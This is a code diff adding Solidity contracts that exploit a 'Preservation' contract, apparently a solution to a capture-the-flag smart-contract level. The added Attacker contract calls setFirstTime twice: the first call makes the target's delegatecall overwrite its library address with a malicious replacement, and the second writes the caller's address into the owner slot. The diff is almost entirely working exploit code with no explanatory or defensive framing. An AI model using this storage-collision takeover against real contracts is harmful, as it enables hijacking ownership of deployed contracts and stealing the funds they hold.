@@ -43,3 +43,39 @@ contract LibraryContract {
         storedTime = _time;
     }
 }
+
+contract Attacker {
+    Preservation public target;
+    LibraryContract public timeZone1Library;
+    LibraryContract public timeZone2Library;
+    MaliciousLibraryReplacement public maliciousLibraryReplacement;
+
+    constructor(
+        Preservation _target,
+        LibraryContract _timeZone1Library,
+        LibraryContract _timeZone2Library
+    ) {
+        target = _target;
+        timeZone1Library = _timeZone1Library;
+        timeZone2Library = _timeZone2Library;
+        maliciousLibraryReplacement = new MaliciousLibraryReplacement();
+    }
+
+    function attack() public {
+        target.setFirstTime(
+            uint256(uint160(address(maliciousLibraryReplacement)))
+        );
+        target.setFirstTime(uint160(msg.sender));
+    }
+}
+
+contract MaliciousLibraryReplacement {
+    // stores a timestamp
+    address public timeZone1LibrarySlot;
+    address public timeZone2LibrarySlot;
+    address public ownerSlot;
+
+    function setTime(uint _time) public {
+        ownerSlot = address(uint160(_time));
+    }
+}
